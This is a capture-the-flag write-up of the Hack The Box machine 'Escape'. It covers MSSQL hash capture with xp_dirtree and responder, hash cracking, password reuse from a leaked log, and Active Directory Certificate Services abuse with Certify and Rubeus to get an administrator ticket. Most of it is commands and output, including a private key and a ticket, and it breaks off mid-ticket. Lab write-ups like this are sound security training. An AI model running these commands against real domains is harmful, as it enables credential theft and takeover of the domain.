---
title: "Escape"
seoTitle: "ADCS Exploitation"
seoDescription: "Conduct an nmap scan on an Active Directory box and exploit vulnerabilities to gain access and retrieve flags from the system"
datePublished: Fri Feb 14 2025 21:17:06 GMT+0000 (Coordinated Universal Time)
cuid: cm759rpab00060ajmg2pzd6vr
slug: escape
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1739293532556/aa14173b-959f-4d46-9a94-1ba383a04204.png
tags: hacking, active-directory, hack-the-box, adcs, htb-machines

---

IP: **10.129.91.54**

Let's begin by conducting a nmap scan to gather information about the target system.

```apache
nmap -sC -sV -o nmap 10.129.91.54
```

```apache
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-11 12:08 EST
Nmap scan report for 10.129.91.54
Host is up (0.32s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-12 01:08:40Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-02-12T01:10:14+00:00; +8h00m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2025-02-12T01:10:12+00:00; +8h00m03s from scanner time.
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2025-02-12T01:10:14+00:00; +8h00m02s from scanner time.
| ms-sql-info: 
|   10.129.91.54:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.129.91.54:1433: 
|     Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-02-12T01:06:12
|_Not valid after:  2055-02-12T01:06:12
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-02-12T01:10:14+00:00; +8h00m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2025-02-12T01:10:12+00:00; +8h00m03s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-02-12T01:09:36
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 8h00m02s, deviation: 0s, median: 8h00m01s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 127.06 seconds
```

From the output, we can see that it has `port 88 kerberos` open, `port 135 RPC` open, `port 139/445 SMB` open, `port 389 ldap` open and `port 5985 win-rm` open. Which suggests that it’s an Active Directory box. We can also see that there is `port 1433 mssql` open.

We can also find the domain name `sequel.htb` and the TLS certificate for `dc.sequel.htb`. So, let’s add this to our host file.

```apache
sudo nano /etc/hosts
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739295376030/f0ce0bab-e384-45e0-a21b-42557124a522.png align="center")

Let’s now start by enumerating SMB shares by trying anonymous access.

```apache
smbclient -L \\\\sequel.htb\\
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739295714354/77026ba0-1d44-4244-b5cf-fca838eca23f.png align="center")

All the shares look pretty standard except the `Public` share.

`A "public share" in SMB (Server Message Block) refers to a shared network directory that is accessible to any user on the network without requiring specific login credentials, essentially making the files within that directory publicly available to anyone with access to the network.`

Let’s now take a look at this share.

```apache
smbclient \\\\sequel.htb\\Public
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739295879784/7130da07-83de-4c4f-a5a1-5ee2948073b7.png align="center")

There is a PDF file. Let’s download it and examine it.

```apache
get "SQL Server Procedures.pdf"
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739295991510/95731130-5284-4191-be53-c43d6ff63aae.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739296688755/9f16c432-9a04-43a6-9580-1b52957b75ed.png align="center")

In the pdf file, we can see some management stuff and in the bonus section, we will find creds that we can use to authenticate via MSSQL as it’s mentioned `SQL Server Authentication`.

```apache
impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@sequel.htb
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739296944942/1abcaae5-04d4-49cc-9197-542fed643ee0.png align="center")

Let's check if the user has `sysadmin` privileges on the databases. This can be done by querying the `syslogins` table.

```sql
select name,sysadmin from syslogins;
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739297286400/46265daa-e96b-4f27-ac77-49bc448374c5.png align="center")

The database is found to have two users, `sa` and `PublicUser` . The current user doesn't have sysadmin privileges, which means we can't use `xp_cmdshell` to execute OS commands directly. So, let's try to elevate our privileges. Let's first list the databases and find the current ones.

```sql
select name from master..sysdatabases;
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739297382358/77cac6de-14db-4094-8770-a6989dd3a4a1.png align="center")

There are just these 4 common databases. Nothing useful to be found here.

After doing some Google searches, we [found](https://www.invicti.com/learn/out-of-band-sql-injection-oob-sqli/) that we can get the database to request a file from us. We can capture the credentials associated with the database service.

Since Windows MSSQL allows stacked commands (ie, just adding `; [another statement]`), We can inject by adding `EXEC master..xp_dirtree "\\[my ip]\test"; --`. This will cause the db to request the file from us.

We’ll use `xp_dirtree` to load a file, and we’ll tell the DB that the file is in an SMB share on our hosts. The server will try to authenticate to our host, where `responder` will collect the Net-NTLMv2.

Let’s fire up the responder now.

```apache
sudo responder -I tun0
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739299149123/02c490de-bd3b-444e-88c6-ec6966172db0.png align="center")

Now, we’ll issue the connection to load a file using `xp_dirtree` from an SMB share (that doesn’t exist) on our host.

```sql
EXEC xp_dirtree '\\10.10.14.180\share', 1, 1
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739299426373/2bbdba33-fc8a-48cb-ac66-f9e5608e9333.png align="center")

We got nothing in the output but let’s check the responder.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739299441926/c403b457-cbf1-43f8-b538-4e0e3d40bf99.png align="center")

And, here we have the hash for the `sql_svc` user which is a service account. Let’s crack this hash now.

```apache
cat hash
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739299548349/637cb1e2-f41a-4592-8aec-68b54bb6a724.png align="center")

```apache
john --wordlist=/usr/share/eaphammer/wordlists/rockyou.txt hash
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739299591901/f33fac50-432a-43c7-9a22-abe878ef5248.png align="center")

We got the password `REGGIE1234ronnie`. Now that we have the credentials for the `sql_svc` user, we can use `evil-winrm` to establish a remote connection to the server.

```apache
evil-winrm -i sequel.htb -u sql_svc -p REGGIE1234ronnie
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739383727637/0ef7c702-8ca2-4d8a-a385-de1c5dbcc9aa.png align="center")

Checking for the users we can see that there’s another user `Ryan.Cooper` present which is our main user as we were not able to find any flag in the home directory of `sql_svc` user.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739383767839/1cd5a450-bc51-4c06-a3e5-b061fa5d99e7.png align="center")

After navigating through files and directories we find there’s another folder named `SQLServer`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739384529121/03f93458-e059-48e1-91c6-9366ab28d719.png align="center")

Checking the contents of the file we can see that there are 2 executables but there’s also a logs folder let’s check the contents of it.

```apache
cd Logs
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739384611292/bd2c13fa-ff0d-49af-bb36-3db8723303ec.png align="center")

So, we found a `ERRORLOG.BAK` file. While doing some research on it we found out that SQL Server `errorlog.bak` is a backup of the SQL Server error log. SQL Server typically keeps backups of the previous six logs.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739384790031/15be2002-14ce-4acc-9e1b-74c0dae8a9ae.png align="center")

Let’s see if we can find something interesting in this.

```apache
type ERRORLOG.BAK
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739384932634/f4b6c1ac-2898-4563-a6c6-25797b8a14c8.png align="center")

In the end, we were able to see something interesting.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739384961294/d8ed3ebc-c0cb-4f04-acc2-8214c334c108.png align="center")

```apache
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.72 spid51      Attempting to load library 'xpstar.dll' into memory. This is an informational message only. No user action is required.
```

According to the contents of the `ERRORLOG.BAK` file, it appears that `Ryan.Cooper` attempted to login into the SQL Server using the password `NuclearMosquito3`. Let’s attempt to log in as Ryan using that password.

Let’s try these creds to get into the system.

```apache
evil-winrm -i sequel.htb -u ryan.cooper -p NuclearMosquito3
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739385222699/19e15d3e-8e3c-4a34-8a65-9deea4ebe9e1.png align="center")

And, we can login into the system let’s grab our user flag now.

```apache
type user.txt
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739385314141/4a367bbc-512e-444c-9f60-0504740d8e14.png align="center")

Flag: ***0ed4345387a7909d7efeb2021b783f4a***

Research done and released as a [whitepaper](https://posts.specterops.io/certified-pre-owned-d95910965cd2) by SpecterOps showed that it was possible to exploit misconfigured certificate templates for privilege escalation and lateral movement.

So first, let’s check if there’s any vulnerable certificate present. For that, we need first to transfer `certify.exe` on our machine.

```apache
upload certify.exe
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739565956095/4960d120-9917-4515-b19b-76c1565dac6a.png align="center")

The README for Certify has a walkthrough of how to enumerate and abuse certificate services. First, it shows running `Certify.exe find /vulnerable`. By default, this looks across standard low-privilege groups.

```apache
.\certify.exe find /vulnerable
```

```bash

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'

[*] Listing info about the Enterprise CA 'sequel-DC-CA'

    Enterprise CA Name            : sequel-DC-CA
    DNS Hostname                  : dc.sequel.htb
    FullName                      : dc.sequel.htb\sequel-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Cert Start Date               : 11/18/2022 12:58:46 PM
    Cert End Date                 : 11/18/2121 1:08:46 PM
    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
      Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates :

    CA Name                               : dc.sequel.htb\sequel-DC-CA
    Template Name                         : UserAuthentication
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
        WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519



Certify completed in 00:00:10.2203371
```

Things to note here are:

1. Template Name: We have a “UserAuthentication” template here which can be used to authenticate a user via Kerberos or LDAP.
    
2. Enrollment Permissions: It’s mentioned that Domain Users of this domain can enroll in a certificate. As our user Ryan is a part of the domain user, we can use his account.
    
3. msPKI-Certificate-Name-Flag: It mentioned “ENROLLEE SUPPLIES SUBJECT” which means we can supply the subject to the certificate template. In this case, we are going to add the subject “altname” which refers to an alternative name \[We are going to use Administrator as the altname and then grab the certificate on behalf of Administrator which we’ll use to authenticate as Admin later.\]
    

For the exploitation, we’ll be referring to the [README scenario 3](https://github.com/GhostPack/Certify?tab=readme-ov-file&source=post_page-----c83a29ecd42f---------------------------------------#example-walkthrough).

```apache
./certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator
```

```bash

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Request a Certificates

[*] Current user context    : sequel\Ryan.Cooper
[*] No subject name specified, using current context as subject.

[*] Template                : UserAuthentication
[*] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] AltName                 : Administrator

[*] Certificate Authority   : dc.sequel.htb\sequel-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 14

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEpgIBAAKCAQEAtA4/MkVikCL5LovL8qL42yV7aNhh3JdKmVWkohWqZ6nDBfdE
YQzCwYF6suHfC4zHTs0Z53M9hDo7B03FXIYQl+3gH0NpuCgUOIOnLgTr3cnZDF5T
ImG/ECi/5HOimhcGujmgHuLItZcM17BPaT9wxs4dOX5rm+Tp7p0ZYEhWA0f8ckO9
TdZ6owvSY+f99JpE+JSYCYQY3iaOHxJuF/Wkd5vI79kXFGs2zdOngLc6DVKXwh8s
MxfXgFZjKRQENxwjC10VxnVaxEKRN36XrQmMmFvQTfvPJnEqaF0lNQGgExGPj5Q6
mLvdaKjB9pJcxtbW7jU9nHl56gBF1+NumcYb6QIDAQABAoIBAQCtQYBCCU38UAri
ZRaMlZFMnlaP3pbcQqA/x48xgBOGyG2m0fX0ROkqdkLw2jNb08z84JLqiZNKJxYh
ww4EJ+TTrMuaia2yzK4Ya2Z0+7tSoSW/pwvr646EKBHt6+8swrdwfn66+ZIUWhK7
gSYIqkkEo9SvPByj17PaLUT7xt8tK3xDgpEX82MGAMebiDL92NaM2Bpsi0yD8qnh
/KEsfp07al4g9GYyQ7HzLWZNjpM85qTePLc5aHGDt8W6wkBvAIvElAb9UHl643Zs
QR1hOemXwr9ULkpnXfDR3uh9N3WORUQsCEi+dc5E5ZbVlLyiPMMh1gyITYZ33Nkk
CN04hT45AoGBANDwT7SLJHopR9NoHwmLY0Rmp3pvvo8QcPz0LiIXs31CZMoBOEKi
OJYpIEl3a8+re844iNv76hXJt2NM53YwjhruJrI98Qhiao6EgxEsqSu2kV5nrbUf
rRBrapGrmrU3ZWNphrXdwE/6wrT0e+VXIMx4CwSx70tP/zw8Vop/jQYPAoGBANyc
f75QvDQXL4JjYEIX5UyW5oi6aT7R0As1qeJV+se6dyNCX58eKqde1t+xWJj6rfdE
poVi5p9YUmYkF5hGWZJeLnVTHMCwfyzg46H3dexFLIzoYpVhM7ynI5bXNOB9wb4p
2cPNyLNCzbgitBiP3WFEdrnijOo9/HRP3XV1k3aHAoGBAJL35uj1UwRHE0nmnKZn
EL1lg/sArUcO5ptX2zeJ+mxqjmD1eLCOUUV2ykpDIWfjlOObKtGqop8O09ualdmy
D9Nrn3aTUX93UsLK/TLQenLQKfMA9NRJ4r+A/2ZWEi3UOJI0AVjeEc9wcRM+QgQx
RFXvPrjfvJX6QGwLeUhUrksLAoGBAM2eQ+YDY9b9QTe7He2cTgi7oPURIaT+c3Tv
OH8PeiUMI5zGcU9iE4lZ+NYXeqdjBiAwaTBrhN5BuNMgkqlH8JZel9icdXEXUAFp
PmEov01PD/3pXnEyXsFX2vDtdohCTgDLCv/X3ldOTWVxWwCFnmXZJPuOL57n1VQn
WBbxVlcjAoGBALDXNvNBjfbGMOOGj1p0AhxBq4jX3K6sfzi8zgPqey6cCzZZ9/d8
rRxZj4s1P2VO1sdsRZIxZLpz3tyaJboGEIcSc3kjFr47KMQF+yJZSsNAZgbmSS0b
fsMk6d5MBsQRmXMkSeV8jBNfxB0GAqaI1Rvc0vg7a7bbQljEeIkbrd52
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGEjCCBPqgAwIBAgITHgAAAA6OrBVQvqIc3wAAAAAADjANBgkqhkiG9w0BAQsF
ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjUwMjE1MDQ0MzIyWhcNMzUwMjEz
MDQ0MzIyWjBTMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYG
c2VxdWVsMQ4wDAYDVQQDEwVVc2VyczEUMBIGA1UEAxMLUnlhbi5Db29wZXIwggEi
MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC0Dj8yRWKQIvkui8vyovjbJXto
2GHcl0qZVaSiFapnqcMF90RhDMLBgXqy4d8LjMdOzRnncz2EOjsHTcVchhCX7eAf
Q2m4KBQ4g6cuBOvdydkMXlMiYb8QKL/kc6KaFwa6OaAe4si1lwzXsE9pP3DGzh05
fmub5OnunRlgSFYDR/xyQ71N1nqjC9Jj5/30mkT4lJgJhBjeJo4fEm4X9aR3m8jv
2RcUazbN06eAtzoNUpfCHywzF9eAVmMpFAQ3HCMLXRXGdVrEQpE3fpetCYyYW9BN
+88mcSpoXSU1AaATEY+PlDqYu91oqMH2klzG1tbuNT2ceXnqAEXX426ZxhvpAgMB
AAGjggLsMIIC6DA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq/N2hdymVof9
lTWDv8NZg4nKNYF338oIhp7sKQIBZQIBBDApBgNVHSUEIjAgBggrBgEFBQcDAgYI
KwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcV
CgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkq
hkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYF
Kw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFGxu0Fo99rQm2mMXQgbh9pbBJzrd
MCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1BZG1pbmlzdHJhdG9yMB8GA1Ud
IwQYMBaAFGKfMqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOg
gbCGga1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVi
bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
bixEQz1zZXF1ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz
ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEE
gbAwga0wgaoGCCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049
QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
bmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/
b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF
AAOCAQEAq1Jp4tWsOGdRbjbRqW/PYrJnskxDxb6jiSEr4ZIDrVTFi9Lejj2d/pBc
AmkAD3SUY9w+a1DxEvv+AyPE+3NsyiSspkMCcPae+CEfEwvwMs9tmCpYkZ5WfNTT
jbVbXf5qmyOvjWEn2iNt1KYgF+xrY8lYAVdOBlfeITJ1gklG9UpDLDcNuBJbBOoF
CutPypi/vlGk3Qk9vsPuyXi/U627pqr5oBM9hObC5D2mRuIn0Ny+Cfcdtr8WzTBl
AwYibpJNdD64tmPFvoNxq7qtXGQRZHhXCA8dUN0aondatE7zE8CFp5SB68o5Ye7g
7oI9pPj1wmaRIP1U9rzqN7OyQDYHkg==
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx



Certify completed in 00:00:13.2004000
```

Both the README and the end of that output show the next step. We’ll copy everything from `-----BEGIN RSA PRIVATE KEY-----` to `-----END CERTIFICATE-----` into a file on our host and convert it to a `.pfx` using the command given, entering no password when prompted.

```apache
gedit cert.pem
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739566703249/6269bd04-f694-426d-b6be-5f58348945db.png align="center")

```apache
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739566757940/25beaf3b-20a6-4ba8-b0f6-8ff79969b18b.png align="center")

Now, let’s transfer Rubeus and `cert.pfx` and try to do pass the ticket attack. But before that, we need to change the permission of our ticket so that while transferring we don’t face any error.

```apache
chmod 777 cert.pfx
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739566962110/9a33322b-49cd-45ee-ab16-825fa2b795d4.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739567093266/5042d7ac-5fed-4aac-8580-5d23bffa6906.png align="center")

let’s run the `asktgt` command, passing it the certificate to get a TGT as administrator.

```apache
.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739567273465/94a4d161-d29b-40a1-af0a-1b70c2afd159.png align="center")

It works! However, Rubeus tries to load the returned ticket directly into the current session, so in theory, once I run this I could just enter the administrator’s folders and get the flag. However, this doesn’t work over Evil-WinRM.

Instead, we’ll try to run the same command with `/getcredentials /show /nowrap`. This will do the same thing, *and* try to dump credential information about the account

```apache
.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials /show /nowrap
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1739567379678/4d6cac7d-d11e-4844-be08-ae1c0356143f.png align="center")

```bash

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3

[*] Action: Ask TGT

[*] Got domain: sequel.htb
[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\administrator'
[*] Using domain controller: fe80::c3e:399:e498:4728%4:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIGSDCCBkSgAwIBBaEDAgEWooIFXjCCBVphggVWMIIFUqADAgEFoQwbClNFUVVFTC5IVEKiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCnNlcXVlbC5odGKjggUaMIIFFqADAgESoQMCAQKiggUIBIIFBMqSgpgZVIWk4IUSVI6/LvyB6xq7Obci4nB5vPjyhBVe6wBXPVZBoqw75zmldBl10WVLB6gSd9Li1Hk663ZF+fSn6YTmKjshcatojdVCNzEFzMqTN2FAwdjFQ2UCv09v3DiG4hdh3PgWkq8HwuDZQlsSwQlxiqpDuifruBKSdnngD19PgiW0vgU2hs1kNUHFN+rsWEc5nYsBqmXNTGovmqgFT1odHOUyCa4hXweShh5kmAlVe0eMGPiNLG4ktq61s58UB0Ooby++3ry78e/sWY0nYQbaax8zZXjduUDvObjdMiacqHaYqgtfKUjxyzCa7CFKbGyPWLd7nbruma1T3m7YLYt9Y+m7fLtCAZra+2MW+YKgCmuixCP3D4mg/hIVvDVQ8yJh/ckcIHMf7L2ab3gnpLLhgTaAr37GWm4s5SIkuSt3Q9NXHIvxVkiTmigPjin21CvhWA8FtxzwW7sQvjHb5y9wbwRx+npcy4i7kzWzfOFDtNoL3nnfnAFG+uBJ9qeufrHKQ4/IaMf7OQpMgle92cI0dpMBpIOG11dT2m9xqEfUxLf2YBbjxWrqGGiFHx9bMXMULvWwEhFuB18CE35Ai1qoWPIOLfgJNpFXyBvid1ZxX1lZaEuQdPERZs1FJT2I1kcEIs8Z/+B0yVUo4KRCYG9gDoYlchK0f3pQtnDlEwvFS+xGz7X7XJDbyAts3Ql9cUS+O0JzXtJ2ZbZMQb5hBCUPNF949yNtJxgSqWLq90FjU3tfXectZM7B/bMYqlBPqpfEoMXOg5yactfbzW5kaJ/gOGj6qfdbqKj+Oedlg+Q4mshGCuvmMsb3wx2Vsew0t29r2tiy5MxHrZ6CJe6A//sTa58VoFrfBG1nrQEIpYI+KkOLzBeX9Wz4WkILQceFSZbqHyZ9K6fu+2QwHzwnbiR1MFSiaAY8fFbNNVrypsSIpK536F7+YjVTB/j62vPaWkvS8HkIBXtm0HWw/LDCpLzydZjjU5LM5wqFtQqIJKoNCAG5N9NDSqSMp5bzd727/Zj33QbfVhfiUWseQE0Ya1Oe5a7ST2qVeGj9IvYAEmJljsT1cwlWyNxRW/E2McHEC71OSvQ36RlH2KhnEAYLsyfQ3yIy7POsja2hJWcZSVsGG9VdHv5nh6YPjUlvDkhk8+VN+pz8KT+dLk1Tfr9hpbRkm9kiNothLQGQRhcxTeppcz4zpinHsouvwGUNvC/eWYNBypl1TUOLuvYnqkYZRMIvEcN8ybZ+fcDCf1FqmxJ/ijWHUO8Q9A7I+B9uel+t6nYIAXvML8P8QVnx1B7HSxyEFQ89CAQjWC26Z3H3hXrZ6qNKfkTXvRc8mEPUn2naFmOsCRgoYag3F/OJR3ApvuTsnWFrYpBBUKHd9OUZ4aOOQ7Js9QNzFN2m+48u+RLYH1QuqdY/eccHILy2WQFvCc0ED8PT2L4mw/K2z1aUeFLYRlBIy0AwB6AwleBx0l/XjvLWJS9v3dIBwUAbqhWjNYyjQ2WJEkOUaTVlInqyyj/gIO0c6FYWQdyMODDYHI66u/12+qpVfBNxDPEhBYkEgFeSaYWc3rnTy293BCCXiNnl